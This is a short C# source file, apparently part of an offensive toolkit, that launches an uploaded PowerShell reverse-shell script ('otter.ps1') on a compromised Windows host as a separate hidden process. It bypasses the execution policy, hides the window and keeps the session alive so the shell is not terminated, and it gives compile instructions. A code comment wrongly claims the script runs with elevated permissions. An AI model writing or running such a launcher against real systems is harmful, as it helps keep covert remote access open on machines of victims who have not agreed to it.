/*
 * author: otter ʕ •ᴥ•ʔ
 *
 * This executable can be used after uploading a PowerShell file on a target host
 * to execute it as a separate process to avoid its termination.
 *
 * To compile the executable use
 * ```
 * chmod +x windows_call_reverse_shell.cs
 * mcs -out:windows_call_reverse_shell.exe windows_call_reverse_shell.cs
 * ```
 */

using System;
using System.Diagnostics;

namespace StartPowerShellScript
{
     class Program
     {
         static void Main(string[] args)
{
             // info to start new process
             ProcessStartInfo psi = new ProcessStartInfo();
             psi.FileName = "powershell.exe";
             // execute revshell script with elevated permissions
             psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File otter.ps1";
             // sets a hidden window
             psi.RedirectStandardError = true;
             psi.RedirectStandardOutput = true;
             psi. UseShellExecute = false;
             Process p = new Process();
             p.StartInfo = psi;
             p.Start();
         }
     }
}
